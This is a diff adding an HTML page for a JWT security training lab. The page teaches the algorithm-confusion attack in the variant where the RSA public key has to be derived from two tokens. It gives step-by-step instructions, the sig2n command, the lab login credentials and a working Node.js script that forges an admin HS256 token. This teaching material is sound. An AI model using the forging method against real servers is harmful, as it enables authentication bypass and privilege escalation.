@@ -1,0 +1,503 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Lab 8: Dashboard - Algorithm Confusion (No Exposed Key)</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #000000;
+            color: #e0e0e0;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px 20px;
+            background: #111111;
+            border: 1px solid #0f3460;
+            border-radius: 8px;
+            margin-bottom: 20px;
+        }
+
+        .header h2 {
+            font-size: 18px;
+            color: #fff;
+        }
+
+        .user-info {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .user-badge {
+            background: #1a1a1a;
+            padding: 5px 12px;
+            border-radius: 4px;
+            font-size: 13px;
+        }
+
+        .btn {
+            padding: 8px 16px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 13px;
+            font-weight: bold;
+            text-decoration: none;
+            display: inline-block;
+        }
+
+        .btn-danger {
+            background: #e94560;
+            color: white;
+        }
+
+        .btn-danger:hover {
+            background: #c73a52;
+        }
+
+        .btn-primary {
+            background: #0f3460;
+            color: white;
+        }
+
+        .btn-primary:hover {
+            background: #1a4a8a;
+        }
+
+        .btn-success {
+            background: #2ecc71;
+            color: white;
+        }
+
+        .btn-success:hover {
+            background: #27ae60;
+        }
+
+        .btn-warning {
+            background: #f39c12;
+            color: white;
+        }
+
+        .btn-warning:hover {
+            background: #e67e22;
+        }
+
+        .card {
+            background: #111111;
+            border: 1px solid #0f3460;
+            border-radius: 8px;
+            padding: 25px;
+            margin-bottom: 20px;
+        }
+
+        .card h3 {
+            color: #e94560;
+            margin-bottom: 15px;
+            font-size: 18px;
+        }
+
+        .step {
+            background: #0a0a0a;
+            border-left: 3px solid #e94560;
+            padding: 12px 15px;
+            margin-bottom: 10px;
+            border-radius: 0 4px 4px 0;
+        }
+
+        .step-number {
+            display: inline-block;
+            background: #e94560;
+            color: white;
+            width: 24px;
+            height: 24px;
+            text-align: center;
+            line-height: 24px;
+            border-radius: 50%;
+            font-size: 12px;
+            font-weight: bold;
+            margin-right: 8px;
+        }
+
+        code {
+            background: #0f3460;
+            padding: 2px 6px;
+            border-radius: 3px;
+            color: #e94560;
+            font-size: 13px;
+        }
+
+        pre {
+            background: #0d1117;
+            border: 1px solid #0f3460;
+            border-radius: 4px;
+            padding: 15px;
+            overflow-x: auto;
+            margin: 10px 0;
+            font-size: 13px;
+            color: #c9d1d9;
+        }
+
+        .endpoint-box {
+            display: flex;
+            gap: 15px;
+            margin-top: 15px;
+            flex-wrap: wrap;
+        }
+
+        .endpoint-card {
+            flex: 1;
+            min-width: 250px;
+            background: #0a0a0a;
+            border: 1px solid #0f3460;
+            border-radius: 8px;
+            padding: 20px;
+            text-align: center;
+        }
+
+        .endpoint-card h4 {
+            margin-bottom: 10px;
+        }
+
+        .endpoint-card.vulnerable {
+            border-color: #e94560;
+        }
+
+        .endpoint-card.secure {
+            border-color: #2ecc71;
+        }
+
+        .token-display {
+            background: #0d1117;
+            border: 1px solid #0f3460;
+            border-radius: 4px;
+            padding: 10px;
+            word-break: break-all;
+            font-family: monospace;
+            font-size: 12px;
+            margin: 10px 0;
+            max-height: 100px;
+            overflow-y: auto;
+        }
+
+        .notice-box {
+            background: #1a0a0a;
+            border: 1px solid #e94560;
+            border-radius: 4px;
+            padding: 15px;
+            margin: 15px 0;
+            font-size: 13px;
+        }
+
+        .notice-box strong {
+            color: #e94560;
+        }
+
+        .copy-btn {
+            background: #0f3460;
+            color: #e94560;
+            border: 1px solid #0f3460;
+            padding: 4px 12px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 12px;
+            margin-left: 10px;
+        }
+
+        .copy-btn:hover {
+            background: #1a4a8a;
+        }
+
+        .tokens-collected {
+            background: #0d1117;
+            border: 1px solid #0f3460;
+            border-radius: 4px;
+            padding: 15px;
+            margin-top: 15px;
+            display: none;
+        }
+
+        .tokens-collected h4 {
+            color: #f39c12;
+            margin-bottom: 10px;
+        }
+
+        .token-item {
+            margin-bottom: 10px;
+        }
+
+        .token-item label {
+            color: #aaa;
+            font-size: 12px;
+            margin-bottom: 4px;
+            display: block;
+        }
+
+        .token-item .token-val {
+            background: #0a0a0a;
+            border: 1px solid #0f3460;
+            border-radius: 4px;
+            padding: 8px;
+            word-break: break-all;
+            font-family: monospace;
+            font-size: 11px;
+            max-height: 60px;
+            overflow-y: auto;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="header">
+        <h2>Lab 8: Algorithm Confusion (No Exposed Key)</h2>
+        <div class="user-info">
+            <span class="user-badge" id="userBadge">Loading...</span>
+            <button class="btn btn-danger" onclick="logout()">Logout</button>
+        </div>
+    </div>
+
+    <!-- Token Display -->
+    <div class="card">
+        <h3>Your Current JWT Token</h3>
+        <div class="token-display" id="tokenDisplay">Loading...</div>
+        <p style="font-size: 13px; color: #888; margin-top: 5px;">This token is signed with <code>RS256</code> using the server's RSA private key. You can view and modify it in Burp Suite.</p>
+    </div>
+
+    <!-- Key Difference Notice -->
+    <div class="card">
+        <h3>Key Difference from Lab 7</h3>
+        <div class="notice-box">
+            <strong>No public key is exposed!</strong><br><br>
+            Unlike Lab 7, this server does <strong>NOT</strong> expose its public key via any endpoint:
+            <ul style="margin-top: 10px; padding-left: 20px; color: #aaa;">
+                <li>No <code>/jwks.json</code> endpoint</li>
+                <li>No <code>/.well-known/jwks.json</code> endpoint</li>
+                <li>No <code>/api/public-key</code> endpoint</li>
+            </ul>
+            <br>
+            You must <strong>derive the public key mathematically</strong> from two valid JWT signatures using a tool like <code>sig2n</code> / <code>rsa_sign2n</code>.
+        </div>
+    </div>
+
+    <!-- Collect Tokens Section -->
+    <div class="card">
+        <h3>Step 1: Collect Two Valid JWT Tokens</h3>
+        <p style="margin-bottom: 15px; color: #aaa;">
+            To derive the server's public key, you need <strong>two different valid JWTs</strong> signed by the same RSA key.
+            You can login twice (or use the button below to get two tokens automatically).
+        </p>
+        <button class="btn btn-warning" onclick="collectTokens()">Collect Two Tokens</button>
+
+        <div class="tokens-collected" id="tokensCollected">
+            <h4>Collected Tokens</h4>
+            <div class="token-item">
+                <label>Token 1:</label>
+                <div class="token-val" id="token1Val"></div>
+                <button class="copy-btn" style="margin-top: 5px;" onclick="copyText('token1Val')">Copy Token 1</button>
+            </div>
+            <div class="token-item">
+                <label>Token 2:</label>
+                <div class="token-val" id="token2Val"></div>
+                <button class="copy-btn" style="margin-top: 5px;" onclick="copyText('token2Val')">Copy Token 2</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Attack Instructions -->
+    <div class="card">
+        <h3>Attack Instructions — Algorithm Confusion with Key Derivation</h3>
+        <p style="margin-bottom: 15px; color: #aaa;">
+            The server uses RSA (RS256) for signing but does NOT expose the public key.
+            However, the RSA public key can be <strong>derived mathematically</strong> from two valid JWT signatures.
+            Once derived, the same algorithm confusion attack from Lab 7 applies.
+        </p>
+
+        <div class="step">
+            <span class="step-number">1</span>
+            <strong>Login and obtain two valid JWT tokens</strong><br>
+            Login with <code>chirayu</code> / <code>chirayu123</code>.
+            Save the first token, logout, login again to get a second token.
+            Or use the "Collect Two Tokens" button above.
+        </div>
+
+        <div class="step">
+            <span class="step-number">2</span>
+            <strong>Derive the server's public key using sig2n</strong><br>
+            Use the PortSwigger <code>rsa_sign2n</code> Docker container or similar tool:
+            <pre># Using PortSwigger's Docker container:
+docker run --rm -it portswigger/sig2n &lt;token1&gt; &lt;token2&gt;
+
+# The tool will output:
+# - Candidate RSA public keys (X.509 / PEM format)
+# - Tampered JWTs signed with each candidate key
+# - You need to test which key is correct</pre>
+        </div>
+
+        <div class="step">
+            <span class="step-number">3</span>
+            <strong>Identify the correct public key</strong><br>
+            The tool generates multiple candidate keys. Test each one:
+            <br>1. Take each candidate public key (X.509 PEM format)
+            <br>2. Sign a test JWT with HS256 using that key as the HMAC secret
+            <br>3. Send it to the server — the correct key will produce a valid response
+            <br><br>
+            <em style="color: #888;">The sig2n tool may also output tampered JWTs — try sending those directly.</em>
+        </div>
+
+        <div class="step">
+            <span class="step-number">4</span>
+            <strong>Intercept the request in Burp Suite</strong><br>
+            Open Burp Suite and configure your browser to use Burp's proxy (127.0.0.1:8080).
+            Navigate to the Vulnerable Admin page and intercept the request.
+        </div>
+
+        <div class="step">
+            <span class="step-number">5</span>
+            <strong>Modify the JWT header — change algorithm</strong><br>
+            Change the algorithm from <code>RS256</code> to <code>HS256</code>:
+            <pre>{
+  "alg": "HS256",
+  "typ": "JWT"
+}</pre>
+        </div>
+
+        <div class="step">
+            <span class="step-number">6</span>
+            <strong>Modify the JWT payload — escalate privileges</strong><br>
+            Change the subject to <code>admin</code>:
+            <pre>{
+  "sub": "admin",
+  "role": "admin"
+}</pre>
+        </div>
+
+        <div class="step">
+            <span class="step-number">7</span>
+            <strong>Sign the token using the derived public key as HMAC secret</strong><br>
+            Use the correct derived public key (PEM format) as the HMAC secret:
+            <pre>// Node.js exploit script:
+const crypto = require('crypto');
+const fs = require('fs');
+
+// Use the derived public key (from sig2n output)
+const derivedKey = fs.readFileSync('derived_public.pem', 'utf8');
+
+// Build header and payload
+const header = Buffer.from(JSON.stringify({
+  alg: 'HS256', typ: 'JWT'
+})).toString('base64url');
+
+const payload = Buffer.from(JSON.stringify({
+  sub: 'admin', role: 'admin'
+})).toString('base64url');
+
+// Sign with HMAC-SHA256 using the derived public key as secret
+const hmac = crypto.createHmac('sha256', derivedKey);
+hmac.update(`${header}.${payload}`);
+const signature = hmac.digest('base64url');
+
+console.log(`${header}.${payload}.${signature}`);</pre>
+        </div>
+
+        <div class="step">
+            <span class="step-number">8</span>
+            <strong>Send the modified request</strong><br>
+            Replace the cookie value with the forged JWT token and forward the request.
+            The server will accept it because it uses the public key to verify HS256 tokens.
+        </div>
+    </div>
+
+    <!-- Endpoints -->
+    <div class="card">
+        <h3>Test Endpoints</h3>
+        <div class="endpoint-box">
+            <div class="endpoint-card vulnerable">
+                <h4 style="color: #e94560;">Vulnerable Admin</h4>
+                <p style="font-size: 13px; color: #aaa; margin-bottom: 15px;">
+                    Trusts <code>alg</code> header — allows algorithm switching
+                </p>
+                <a href="/vulnerable-admin.html" class="btn btn-danger">Access Vulnerable Admin</a>
+            </div>
+            <div class="endpoint-card secure">
+                <h4 style="color: #2ecc71;">Secure Admin</h4>
+                <p style="font-size: 13px; color: #aaa; margin-bottom: 15px;">
+                    Enforces <code>RS256</code> only — rejects algorithm switching
+                </p>
+                <a href="/secure-admin.html" class="btn btn-success">Access Secure Admin</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Load user info
+        async function loadUser() {
+            try {
+                const res = await fetch('/api/me');
+                const data = await res.json();
+                if (data.user) {
+                    document.getElementById('userBadge').textContent = `Logged in as: ${data.user.sub} (${data.user.role})`;
+                }
+            } catch (e) {
+                window.location.href = '/';
+            }
+        }
+
+        // Show token
+        function showToken() {
+            const cookies = document.cookie.split(';');
+            for (let c of cookies) {
+                const [name, value] = c.trim().split('=');
+                if (name === 'token') {
+                    document.getElementById('tokenDisplay').textContent = value;
+                    return;
+                }
+            }
+            document.getElementById('tokenDisplay').textContent = 'No token found';
+        }
+
+        // Collect two tokens for key derivation
+        async function collectTokens() {
+            try {
+                const res = await fetch('/api/collect-tokens', { method: 'POST' });
+                const data = await res.json();
+
+                if (data.token1 && data.token2) {
+                    document.getElementById('token1Val').textContent = data.token1;
+                    document.getElementById('token2Val').textContent = data.token2;
+                    document.getElementById('tokensCollected').style.display = 'block';
+                }
+            } catch (e) {
+                alert('Failed to collect tokens. Are you logged in?');
+            }
+        }
+
+        function copyText(elementId) {
+            const text = document.getElementById(elementId).textContent;
+            navigator.clipboard.writeText(text);
+        }
+
+        async function logout() {
+            await fetch('/logout', { method: 'POST' });
+            document.cookie = 'token=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;';
+            window.location.href = '/';
+        }
+
+        loadUser();
+        showToken();
+    </script>
+</body>
+
+</html>
